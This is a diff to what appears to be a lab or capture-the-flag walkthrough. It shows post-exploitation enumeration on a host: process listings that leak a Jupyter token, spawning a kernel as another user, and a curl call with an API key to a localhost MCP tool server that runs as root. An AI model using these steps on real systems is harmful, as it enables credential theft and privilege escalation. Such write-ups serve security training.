@@ -111,17 +111,20 @@ Accept-Encoding: gzip, deflate, br
 }
 
 got the reverse shell
-```
-```
+
 
 
 Enumeration as mcp-dev
+
+ss -tlnp       # revealed ports 8888 and 5000 only on localhost
+ps aux | grep jupyter  # leaked the full jupyter command including the token
 
 mcp-dev@devhub:/opt/mcpjam/node_modules$ ps aux | grep -i jupyter
 analyst     1062  0.0  2.4 181500 96240 ?        Ss   00:27   0:04 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
 root        1070  0.0  0.7  37376 28728 ?        Ss   00:27   0:07 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
 mcp-dev     2475  0.0  0.0   6828  2036 pts/0    S+   11:25   0:00 grep --color=auto -i jupyter
 
+Created a kernel — spawned a Python3 interpreter running as analyst
 
 <modules$ curl -s http://127.0.0.1:5000/tools/call \
 >   -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
